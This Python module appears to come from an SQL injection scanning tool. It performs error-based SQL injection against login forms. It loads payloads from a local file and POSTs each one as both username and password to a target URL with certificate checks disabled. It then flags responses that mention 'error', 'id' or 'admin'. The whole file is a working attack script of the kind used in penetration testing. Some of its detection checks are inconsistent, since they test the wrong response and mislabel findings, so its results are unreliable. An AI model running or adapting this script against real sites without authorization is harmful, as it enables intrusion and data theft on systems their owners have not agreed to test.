import os
import asyncio
import re
import requests
from colorama import Fore,init
from datetime import datetime
import inspect
import traceback
from bs4 import BeautifulSoup
import sys
import os
import logging

current_directory = os.getcwd()

sys.path.append(current_directory)


attack_type = "authentication bypass SQL injection"
from lib.scripts.headers import Prepare_the_headers
from lib.scripts.headers import headers
from lib.scripts.headers import header
from  lib.regelexpression.patterns import Detect
from lib.priority.Priority import PRIORITY
from lib.priority.Priority import HARMFULL
from logger.logs import logger
from Exceptions.exceptions import SQLJNGUserExit
from lib.result.Results import safe_SQLJNG_result
from lib.result.Results import SQLJNG_result_report
from Exceptions.exceptions import SQLJNGStackRangeError
from lib.Stacks.stack import html_response
from lib.Attacktype.Attacks import HeaderAttacks
from lib.SQLJNGDataTypes.Magicdicts import magic_dict
from logger.sqljlog import logger as sqljlog


attack_type = "Error Based SQL Injection"
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}

""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads"""

ack = None
capturesERRBASED = []
pattern = r"\berror\b"
htmlpattern = r"\bid\b"

threshold_for_error_parameter = 0
threshold_for_id_parameter = 0
  
async def Error_based_inj_HEADER(urls):
    """This is for error based SQL injection. You can realize to the SQL structure by this Injection if it works."""
    try: 
        global pattern,htmlpattern,threshold_for_error_parameter,threshold_for_id_parameter
        done = False 
        filename = "Error_based.txt" 
        current_directory = os.path.dirname(os.path.abspath((__file__)))
        file_path = os.path.join(current_directory, filename) 

        with open(file_path, "r") as file: 
            payload = file.read() 
            rows = payload.split("\n") 
            sorted_rows = sorted(rows) 
            sorted_payload = "\n".join(sorted_rows) 
            print(Fore.RED + str(sorted_payload)) 
            requests.packages.urllib3.disable_warnings() 
            req = requests.get(url=urls,verify=False)
            if req.status_code == 200:
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the ip url: {urls}\n Do you want to send the payload to the website? ")
                logger.info(f"The website:{urls} is up with the status code:{req.status_code}")

                if ask.lower() == "y":
                    sqljlog.info(f"Testing:{HeaderAttacks.ERROR_BASED_SQL_INJECTION_HEADER.value}")

                    for line in sorted_payload.split("\n"):
                        sqljlog.info(f"Testing:{line if len(line) <50 else line.split("\n")}")

                        params = {
                            "username": line,
                            "password": line
                        }
                        
                        ack = requests.post(url=urls, data=params,verify=False)
                        await asyncio.sleep(5)
                        if "error" in ack.text:
                            logger.info(f"Could find parameter Error,keyword:{line}")
                            Detect(ack.text)
                            threshold_for_error_parameter += 1
                            html_response.push(ack.text)
                            
                        vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE)
                        htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE)
                        if vuln:
                            logger.info(f"Could find id parameter, keyword:{line}")
                            Detect(ack.text)
                            threshold_for_id_parameter += 1
                            await asyncio.sleep(3)
                            html_response.push(ack.text)
                        
                        if htmlVULN:
                            logger.info(f"Could find error parameter, keyword:{line}")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            threshold_for_error_parameter += 1
                            html_response.push(ack.text)
                        
                        word = "id" in req.text
                        errword = "error" in req.text
                        if word:
                            logger.info(f"Could find parameter id, keyword:{line}")
                            Detect(ack.text)
                            threshold_for_id_parameter += 1
                            await asyncio.sleep(3)
                            html_response.push(ack.text)
                        
                        if errword:
                            logger.info(f"Could find parameter error, keyword:{line}")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            threshold_for_error_parameter += 1
                            html_response.push(ack.text)
                            
                        
                            
                    if ack.status_code == 302:
                        logger.info(f"Could inject parameter,keyword:{line},target:{urls}")

                        done = True
                        
                    if "Admin" in vuln or "admin" in vuln or "Admin" in ack.text or "admin" in ack.text or "Admin" in htmlVULN or "admin" in htmlVULN:
                        logger.info(f"Could find parameter admin,keyword:{line},target:{urls}")
                        Detect(ack.text)
                        await asyncio.sleep(3)
                        html_response.push(ack.text)
                
                elif ask.lower() == "n":
                    raise SQLJNGUserExit
                
                else:
                    pass
                        
            else:
                logger.info(f"Could not connect to the target:{urls} ")

                  

        
    except Exception as e:
        logger.error(f"Error: {e}")
        
 
        
    except KeyboardInterrupt:
        logger.info("^C User Interrupted the program.")
        
        raise SystemExit
    except UnboundLocalError:
        pass
    
        

    finally:
        magic_dict.insert_captures_to_dict(f"HTML:{HeaderAttacks.ERROR_BASED_SQL_INJECTION_HEADER.value}",html_response)
        try:
            await SQLJNG_result_report(html_response)
        except SQLJNGStackRangeError:
            result = safe_SQLJNG_result(html_response)
            for res in html_response:
                logger.info(res)
        
        
     
# asyncio.run(Error_based_inj_HEADER("http://testfire.net/login.jsp"))